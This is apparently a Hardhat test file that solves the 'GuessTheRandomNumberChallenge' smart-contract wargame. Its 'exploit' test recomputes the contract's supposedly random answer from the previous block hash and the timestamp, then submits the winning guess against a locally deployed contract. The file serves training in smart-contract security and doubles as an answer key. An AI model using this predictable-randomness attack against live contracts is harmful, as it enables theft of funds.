import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {

    // Get the current timestamp
    const blockNumber = await ethers.provider.getBlockNumber();
    const timestamp = (await ethers.provider.getBlock(blockNumber)).timestamp;
    const hash = (await ethers.provider.getBlock(blockNumber-1)).hash;
    const generatedAnswer = ethers.utils.solidityKeccak256(
      ["bytes32", "uint256"],
      [hash, timestamp]
    );
    console.log(generatedAnswer)
    const hexString = generatedAnswer[generatedAnswer.length - 2] + generatedAnswer[generatedAnswer.length - 1];
    const uint8 = parseInt(hexString,16);
    await target.guess(uint8,{value:ethers.utils.parseEther('1')});
    expect(await target.isComplete()).to.equal(true);
  });
});
